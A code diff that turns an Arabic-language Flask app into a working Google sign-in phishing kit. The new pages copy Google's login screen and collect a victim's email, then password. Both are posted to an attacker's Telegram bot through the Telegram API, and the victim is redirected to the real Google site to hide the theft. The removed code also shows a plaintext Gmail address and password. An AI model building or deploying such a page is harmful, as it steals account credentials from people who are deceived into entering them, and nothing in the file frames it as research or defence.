@@ -1,315 +1,315 @@
 import os
+import re
 import requests
-from flask import Flask, redirect, render_template_string, request
+from flask import Flask, redirect, render_template_string, request, session, url_for
 
 app = Flask(__name__)
 app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-GOOGLE_LOGIN_URL = "https://accounts.google.com"
 
-# الصفحة الأولى: الترحيب وزر التالي
-@app.route("/")
-def home():
-  return render_template_string("""
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PATRICK MOD</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { 
-            background: #130718; 
-            color: #ffffff;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            width: 100vw; 
-            padding: 20px; 
-        }
-        .container { 
-            width: 100%; 
-            max-width: 450px; 
-            text-align: center; 
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .logo-container {
-            margin-bottom: 35px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .glowing-circle {
-            width: 140px;
-            height: 140px;
-            border-radius: 50%;
-            border: 3px solid #ff0000;
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
-            margin-bottom: 15px;
-            background: #050505;
-        }
-        .mod-title {
-            color: #ff2a2a;
-            font-size: 22px;
-            font-weight: 800;
-            letter-spacing: 1.5px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
-        }
-        h1 { color: #ff2a2a; font-size: 24px; font-weight: 800; letter-spacing: 1px; text-shadow: 0 0 10px rgba(255, 0, 0, 0.2); margin-bottom: 40px; }
-        .next-btn { 
-            display: block; 
-            width: 100%; 
-            background: #28a745; 
-            color: white; 
-            border: none; 
-            border-radius: 12px; 
-            padding: 16px; 
-            font-size: 17px; 
-            font-weight: 600; 
-            text-decoration: none; 
-            cursor: pointer; 
-            transition: background 0.2s; 
-        }
-        .next-btn:hover { background: #218838; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="logo-container">
-            <div class="glowing-circle"></div>
-            <div class="mod-title">PATRICK MOD</div>
-        </div>
-        <h1>Welcome to PATRICK MOD</h1>
-        <a href="/step2" class="next-btn">التالي</a>
-    </div>
-</body>
-</html>
-""")
+GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
-# الصفحة الثانية: التحقق من النص
-@app.route("/step2", methods=["GET", "POST"])
-def step2():
+
+# الصفحة الأولى: إدخال البريد الإلكتروني أو الهاتف
+@app.route("/", methods=["GET", "POST"])
+def step1():
   error = ""
   if request.method == "POST":
-    user_text = request.form.get("secret_text", "").strip()
-    if user_text == "12345P3":
-      return redirect("/step3")
-    else:
-      error = "النص غير صحيح، يرجى كتابة 12345P3 للمتابعة!"
+    email_val = request.form.get("email", "").strip()
 
-  return render_template_string("""
+    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
+    phone_pattern = r"^\+?[0-9]{10,15}$"
+
+    if not (
+        re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
+    ):
+      error = (
+          "لم يتم العثور على حسابك على Google. يُرجى التحقق من عنوان البريد"
+          " الإلكتروني."
+      )
+    else:
+      # حفظ الإيميل في الجلسة للانتقال للصفحة التالية
+      session["user_email"] = email_val
+      return redirect(url_for("step2"))
+
+  return render_template_string(
+      """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق الأمني • PATRICK MOD</title>
+    <title>تسجيل الدخول - حسابات Google</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { 
-            background: #130718; 
-            color: #ffffff;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            width: 100vw; 
-            padding: 20px; 
-        }
-        .container { 
-            width: 100%; 
-            max-width: 450px; 
-            text-align: center; 
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
+        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        
+        .login-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 24px;
             display: flex;
             flex-direction: column;
             align-items: center;
-        }
-        .logo-container {
-            margin-bottom: 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        .glowing-circle {
-            width: 140px;
-            height: 140px;
-            border-radius: 50%;
-            border: 3px solid #ff0000;
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
-            margin-bottom: 15px;
-            background: #050505;
-        }
-        .mod-title {
-            color: #ff2a2a;
-            font-size: 22px;
-            font-weight: 800;
-            letter-spacing: 1.5px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
-        }
-        p.instruction { color: #dddddd; font-size: 16px; margin-bottom: 25px; font-weight: 500; line-height: 1.6; }
-        .error-msg { color: #ff4d4d; font-size: 14px; margin-bottom: 15px; background: rgba(255, 77, 77, 0.1); padding: 12px; border-radius: 10px; border: 1px solid #ff4d4d; width: 100%; }
-        form { width: 100%; }
-        input[type="text"] { 
-            width: 100%; 
-            background: #1e0f29; 
-            border: 1px solid #3a1f4c; 
-            border-radius: 12px; 
-            padding: 16px; 
-            font-size: 17px; 
-            color: #ffffff; 
-            outline: none; 
-            margin-bottom: 20px; 
             text-align: center;
-            letter-spacing: 1px;
+            justify-content: center;
         }
-        input[type="text"]:focus { border-color: #ff2a2a; box-shadow: 0 0 8px rgba(255, 42, 42, 0.3); }
-        .submit-btn { 
+
+        .google-g {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 16px;
+        }
+
+        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        .subtitle { font-size: 15px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
+
+        .error-msg { 
+            color: #d93025; 
+            font-size: 13px; 
+            line-height: 20px; 
+            margin-bottom: 15px; 
             width: 100%; 
-            background: #28a745; 
-            color: white; 
-            border: none; 
-            border-radius: 12px; 
-            padding: 16px; 
-            font-size: 17px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            transition: background 0.2s;
+            text-align: right; 
+            background: #fce8e6; 
+            padding: 12px; 
+            border-radius: 8px; 
+            border: 1px solid #fad2cf; 
         }
-        .submit-btn:hover { background: #218838; }
+
+        .input-group { width: 100%; margin-bottom: 15px; }
+        .input-group input {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            outline: none;
+            color: #202124;
+            background: #fff;
+        }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px 13px; }
+
+        .links-row {
+            width: 100%;
+            display: flex;
+            justify-content: flex-start;
+            margin-bottom: 30px;
+        }
+        .links-row a {
+            color: #1a73e8;
+            font-size: 14px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .links-row a:hover { text-decoration: underline; }
+
+        .submit-btn {
+            width: 100%;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .submit-btn:hover { background: #1558b0; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo-container">
-            <div class="glowing-circle"></div>
-            <div class="mod-title">PATRICK MOD</div>
-        </div>
-        
-        <p class="instruction">الرجاء كتابة 12345P3 للتأكد من أنك شخص حقيقي وليس روبوت</p>
+    <div class="login-container">
+        <svg class="google-g" viewBox="0 0 24 24">
+            <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
+            <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.14C3.15 21.32 7.23 24 12 24z"/>
+            <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.62H1.18C.43 8.12 0 9.8 0 12s.43 3.88 1.18 5.38l3.14-3.14-.05-.00z"/>
+            <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.15 2.68 1.18 6.62l4.09 3.14c.95-2.85 3.6-4.96 6.73-4.96z"/>
+        </svg>
+
+        <div class="title">تسجيل الدخول</div>
+        <div class="subtitle">يُرجى استخدام حسابك على Google. ستتم إضافة الحساب إلى هذا الجهاز وسيكون متاحًا لاستخدامه في تطبيقات Google الأخرى.</div>
+
         {% if error %}
             <div class="error-msg">{{ error }}</div>
         {% endif %}
-        <form method="POST">
-            <input type="text" name="secret_text" required placeholder="أدخل النص هنا">
+
+        <form method="POST" style="width: 100%;">
+            <div class="input-group">
+                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
+            </div>
+            <div class="links-row">
+                <a href="#">هل نسيت بريدك الإلكتروني؟</a>
+            </div>
             <button type="submit" class="submit-btn">التالي</button>
         </form>
     </div>
 </body>
 </html>
-""", error=error)
+""",
+      error=error,
+  )
 
-# الصفحة الثالثة: تسجيل الدخول
-@app.route("/step3")
-def step3():
-  if BOT_TOKEN and CHAT_ID:
-    try:
-      msg = "🎯 اجتاز المستخدم اختبار الروبوت ووصل للصفحة الأخيرة في PATRICK MOD!"
-      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg}, timeout=5)
-    except:
-      pass
 
-  return render_template_string(f"""
+# الصفحة الثانية: إدخال كلمة المرور
+@app.route("/step2", methods=["GET", "POST"])
+def step2():
+  user_email = session.get("user_email", "")
+  if not user_email:
+    return redirect(url_for("step1"))
+
+  error = ""
+  if request.method == "POST":
+    password = request.form.get("password", "")
+
+    if len(password) <= 6:
+      error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
+    else:
+      if BOT_TOKEN and CHAT_ID:
+        msg = (
+            "📸 تم استلام بيانات Google جديدة:\n\n📧 البريد:"
+            f" {user_email}\n🔑 الباسورد: {password}"
+        )
+        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
+
+      # مسح الجلسة والتحويل لموقع جوجل الرسمي
+      session.pop("user_email", None)
+      return redirect(GOOGLE_OFFICIAL_URL)
+
+  return render_template_string(
+      """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول • PATRICK MOD</title>
+    <title>تسجيل الدخول - حسابات Google</title>
     <style>
-        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
-        body {{ 
-            background: #130718; 
-            color: #ffffff;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-            width: 100vw; 
-            padding: 20px; 
-        }}
-        .container {{ 
-            width: 100%; 
-            max-width: 450px; 
-            text-align: center; 
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }}
-        .logo-container {{
-            margin-bottom: 30px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }}
-        .glowing-circle {{
-            width: 140px;
-            height: 140px;
-            border-radius: 50%;
-            border: 3px solid #ff0000;
-            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
-            margin-bottom: 15px;
-            background: #050505;
-        }}
-        .mod-title {{
-            color: #ff2a2a;
-            font-size: 22px;
-            font-weight: 800;
-            letter-spacing: 1.5px;
-            text-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
-        }}
-        p {{ color: #dddddd; font-size: 15.5px; line-height: 1.6; margin-bottom: 20px; }}
-        .cred-box {{ 
-            background: #1e0f29; 
-            border: 1px solid #3a1f4c; 
-            border-radius: 12px; 
-            padding: 16px; 
-            margin-bottom: 22px; 
-            text-align: left; 
-            direction: ltr;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
+        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        
+        .login-container {
             width: 100%;
-        }}
-        .cred-item {{ color: #ff2a2a; font-size: 15px; margin-bottom: 8px; font-family: monospace; font-weight: bold; }}
-        .login-btn {{ 
-            display: block; 
+            max-width: 400px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            justify-content: center;
+        }
+
+        .google-logo {
+            font-size: 26px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 4px;
+        }
+        
+        .google-logo span span:nth-child(1) { color: #4285F4; }
+        .google-logo span span:nth-child(2) { color: #EA4335; }
+        .google-logo span span:nth-child(3) { color: #FBBC05; }
+        .google-logo span span:nth-child(4) { color: #4285F4; }
+        .google-logo span span:nth-child(5) { color: #34A853; }
+        .google-logo span span:nth-child(6) { color: #EA4335; }
+
+        .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        
+        .user-chip {
+            display: inline-flex;
+            align-items: center;
+            padding: 4px 12px 4px 4px;
+            border: 1px solid #dadce0;
+            border-radius: 100px;
+            margin-bottom: 24px;
+            font-size: 14px;
+            color: #3c4043;
+            gap: 8px;
+            background: #fff;
+        }
+        .user-chip svg { width: 20px; height: 20px; }
+
+        .error-msg { 
+            color: #d93025; 
+            font-size: 13px; 
+            line-height: 20px; 
+            margin-bottom: 15px; 
             width: 100%; 
-            background: #28a745; 
-            color: white; 
-            border: none; 
-            border-radius: 12px; 
-            padding: 16px; 
-            font-size: 17px; 
-            font-weight: 600; 
-            text-decoration: none; 
-            cursor: pointer; 
-            transition: background 0.2s; 
-        }}
-        .login-btn:hover {{ background: #218838; }}
+            text-align: right; 
+            background: #fce8e6; 
+            padding: 12px; 
+            border-radius: 8px; 
+            border: 1px solid #fad2cf; 
+        }
+
+        .input-group { width: 100%; margin-bottom: 15px; }
+        .input-group input {
+            width: 100%;
+            padding: 16px 14px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            outline: none;
+            color: #202124;
+            background: #fff;
+        }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px 13px; }
+
+        .submit-btn {
+            width: 100%;
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        .submit-btn:hover { background: #1558b0; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo-container">
-            <div class="glowing-circle"></div>
-            <div class="mod-title">PATRICK MOD</div>
+    <div class="login-container">
+        <div class="google-logo">
+            <span>
+                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            </span>
         </div>
         
-        <p>الرجاء تسجيل الدخول بالبريد الإلكتروني لمتابعة تنزيل hide online من هناك :</p>
-        <div class="cred-box">
-            <div class="cred-item"><b>Email:</b> patrickmod156@gmail.com</div>
-            <div class="cred-item"><b>Password:</b> PM.smash,mod</div>
+        <div class="title">مرحبًا</div>
+        
+        <div class="user-chip">
+            <svg viewBox="0 0 24 24"><path fill="#5f6368" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+            <span>{{ user_email }}</span>
         </div>
-        <a href="{GOOGLE_LOGIN_URL}" class="login-btn" target="_blank">تسجيل الدخول</a>
+
+        {% if error %}
+            <div class="error-msg">{{ error }}</div>
+        {% endif %}
+
+        <form method="POST" style="width: 100%;">
+            <div class="input-group">
+                <input type="password" name="password" required placeholder="إدخال كلمة المرور">
+            </div>
+            <button type="submit" class="submit-btn">التالي</button>
+        </form>
     </div>
 </body>
 </html>
-""")
+""",
+      error=error,
+      user_email=user_email,
+  )
+
 
 if __name__ == "__main__":
   app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
